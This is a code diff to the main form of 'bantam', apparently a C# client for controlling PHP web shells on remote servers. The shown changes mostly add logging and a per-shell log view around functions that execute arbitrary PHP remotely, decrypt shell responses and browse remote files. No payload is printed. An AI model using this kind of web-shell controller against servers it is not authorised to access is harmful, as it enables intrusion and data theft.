@@ -16,6 +16,11 @@ namespace bantam
     public partial class BantamMain : Form
     {
         /// <summary>
+        /// 
+        /// </summary>
+        public static BantamMain instance;
+
+        /// <summary>
         /// Full path and name of xml file if a file has opened (used for saving)
         /// </summary>
         private static string g_OpenFileName;
@@ -36,11 +41,16 @@ namespace bantam
         /// </summary>
         public BantamMain()
         {
+            //Store instance ref accessable statically
+            instance = this;
+
+            //Default UI Component Initialization
             InitializeComponent();
 
             //has to be initialized with parameters manually because, constructor with params breaks design mode...
             txtBoxFileBrowserPath.Initialize(btnFileBrowserBack_MouseClick, 21);
 
+            //setup custom sorter for filebrowser
             treeViewFileBrowser.TreeViewNodeSorter = new FileBrowserTreeNodeSorter();
         }
 
@@ -72,6 +82,21 @@ namespace bantam
                 return true;
             }
             return false;
+        }
+
+
+        /// <summary>
+        /// 
+        /// </summary>
+        /// <param name="log"></param>
+        public delegate void AppendToRichTextBoxLogsDelegate(string log);
+        public void AppendToRichTextBoxLogs(string log)
+        {
+            if (this.InvokeRequired) {
+                this.Invoke(new AppendToRichTextBoxLogsDelegate(AppendToRichTextBoxLogs), new object[] { log });
+                return;
+            }
+            richTextBoxLogs.Text += log;
         }
 
         /// <summary>
@@ -143,7 +168,6 @@ namespace bantam
         public async Task InitializeShellData(string shellUrl)
         {
             if (string.IsNullOrEmpty(shellUrl) == false) {
-                string[] data;     
                 bool encryptResponse = Shells[shellUrl].ResponseEncryption;
                 int ResponseEncryptionMode = Shells[shellUrl].ResponseEncryptionMode;
 
@@ -167,7 +191,7 @@ namespace bantam
                             result = EncryptionHelper.DecryptShellResponse(response.Result, response.EncryptionKey, response.EncryptionIV, ResponseEncryptionMode);
                         }
 
-                        data = result.Split(new [] { PhpBuilder.g_delimiter }, StringSplitOptions.None);
+                        string[] data = result.Split(new [] { PhpBuilder.g_delimiter }, StringSplitOptions.None);
                         
                         var initDataReturnedVarCount = Enum.GetValues(typeof(ShellInfo.INIT_DATA_VARS)).Cast<ShellInfo.INIT_DATA_VARS>().Max();
 
@@ -200,11 +224,10 @@ namespace bantam
         /// <returns></returns>
         private async static Task<string> ExecutePHPCode(string shellUrl, string phpCode, bool encryptResponse, int ResponseEncryptionMode)
         {
-            //todo get caller function name for logging
             ResponseObject response = await WebHelper.ExecuteRemotePHP(shellUrl, phpCode).ConfigureAwait(false);
 
             if (string.IsNullOrEmpty(response.Result)) {
-                //todo level 3 logging
+                LogHelper.AddShellLog(shellUrl, "Empty response from code ( " + phpCode + " )", 3);
                 return string.Empty;
             }
 
@@ -215,7 +238,7 @@ namespace bantam
             }
 
             if (string.IsNullOrEmpty(result)) {
-                //todo level 3 logging
+                LogHelper.AddShellLog(shellUrl, "Empty response decrypted from code ( " + phpCode + " )", 3);
                 return string.Empty;
             }
 
@@ -238,8 +261,6 @@ namespace bantam
 
             if (!string.IsNullOrEmpty(newUserAgent)) {
                 WebHelper.g_CurrentUserAgent = newUserAgent;
-            } else {
-                //todo logging
             }
         }
 
@@ -275,7 +296,7 @@ namespace bantam
                     await WebHelper.ExecuteRemotePHP(shellUrl, code).ConfigureAwait(false);
                 }
             } else {
-                //todo logging
+                LogHelper.AddShellLog(shellUrl, "Attempted to eval empty code.", 3);
             }
         }
 
@@ -383,7 +404,6 @@ namespace bantam
                 Shells[shellUrl].PingStopwatch = new Stopwatch();
                 Shells[shellUrl].PingStopwatch.Start();
 
-                //todo test this when shell has gone away
                 string phpCode = PhpBuilder.PhpTestExecutionWithEcho1(encryptResponse);
                 string result = await ExecutePHPCode(shellUrl, phpCode, encryptResponse, ResponseEncryptionMode);
 
@@ -458,12 +478,22 @@ namespace bantam
                     Shells[g_SelectedShellUrl].ConsoleText = richTextBoxConsoleOutput.Text;
                 }
 
+                if (!string.IsNullOrEmpty(richTextBoxLogs.Text)) {
+                    Shells[g_SelectedShellUrl].LogText = richTextBoxLogs.Text;
+                }
+
                 g_SelectedShellUrl = lvi.SubItems[0].Text;
 
                 if (!string.IsNullOrEmpty(Shells[g_SelectedShellUrl].ConsoleText)) {
                     richTextBoxConsoleOutput.Text = Shells[g_SelectedShellUrl].ConsoleText;
                 } else {
                     richTextBoxConsoleOutput.Text = string.Empty;
+                }
+
+                if (!string.IsNullOrEmpty(Shells[g_SelectedShellUrl].LogText)) {
+                    richTextBoxLogs.Text = Shells[g_SelectedShellUrl].LogText;
+                } else {
+                    richTextBoxLogs.Text = string.Empty;
                 }
 
                 if (Shells[g_SelectedShellUrl].IsWindows) {
@@ -477,7 +507,6 @@ namespace bantam
                 }
 
                 foreach (ListViewItem lvClients in listViewShells.Items) {
-                    //todo store color and revert to original color, for now skip if red
                     if (lvClients.BackColor != System.Drawing.Color.Red) {
                         lvClients.BackColor = System.Drawing.SystemColors.Window;
                         lvClients.ForeColor = System.Drawing.SystemColors.WindowText;
@@ -635,7 +664,7 @@ namespace bantam
                 if (Shells.ContainsKey(g_SelectedShellUrl)) {
 
                     if (!Shells.TryRemove(g_SelectedShellUrl, out ShellInfo outShellInfo)) {
-                        //todo global logging
+                        LogHelper.AddShellLog(g_SelectedShellUrl, "Attempted to remove shell and operation failed.", 3);
                     }
                 }
             }
@@ -858,7 +887,7 @@ namespace bantam
         private async Task FileBrowserRender(string result, string shellUrl, TreeNode baseTn = null)
         {
             if (shellUrl != g_SelectedShellUrl) {
-                //user has changed shells on the ui, todo update cache instead
+                LogHelper.AddShellLog(g_SelectedShellUrl+"/"+ shellUrl, "Detected shell change before filebrowser rendered.", 2);
                 return;
             }
 
@@ -1027,8 +1056,6 @@ namespace bantam
 
                     if (string.IsNullOrEmpty(result) == false) {
                         FileBrowserRender(result, shellUrl, tn);
-                    } else {
-                        //todo level 3 logging
                     }
                 }
             }
